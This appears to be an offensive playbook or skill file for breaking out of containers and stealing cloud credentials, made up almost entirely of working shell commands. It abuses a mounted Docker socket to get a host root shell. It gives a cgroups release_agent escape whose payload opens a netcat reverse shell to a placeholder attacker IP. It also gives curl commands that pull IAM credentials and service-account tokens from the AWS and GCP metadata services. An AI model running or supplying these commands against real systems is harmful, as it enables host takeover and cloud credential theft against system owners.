---
name: "container-cloud-escape"
description: "Offensive container breakout, Docker socket abuse, Kubernetes privilege escalation, and Cloud metadata service (AWS IMDSv1/v2, GCP, Azure) token exfiltration."
---

# Container Breakout & Cloud Metadata Exploitation Playbook

## 1. Docker Socket Abuse (`/var/run/docker.sock`)
If the Docker socket is mounted inside the container:
```bash
# Check if docker socket is writable
ls -la /var/run/docker.sock

# Spawn privileged root container mounting the entire host filesystem:
docker run -v /:/host -it alpine chroot /host /bin/bash
# Host root shell obtained!
```

## 2. Privileged Container Escape (`--privileged`)
```bash
# Verify capsh capabilities
capsh --print | grep cap_sys_admin

# Exploit cgroups release_agent:
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "nc -e /bin/sh <KALI_IP> 4444" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

## 3. Cloud Metadata Exfiltration (AWS IMDSv1/v2 & GCP)
When SSRF or command execution is achieved inside cloud workloads:

```bash
# AWS IMDSv1 (Direct Query):
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS IMDSv2 (Session Token Required):
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Google Cloud Platform (GCP Metadata):
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
```
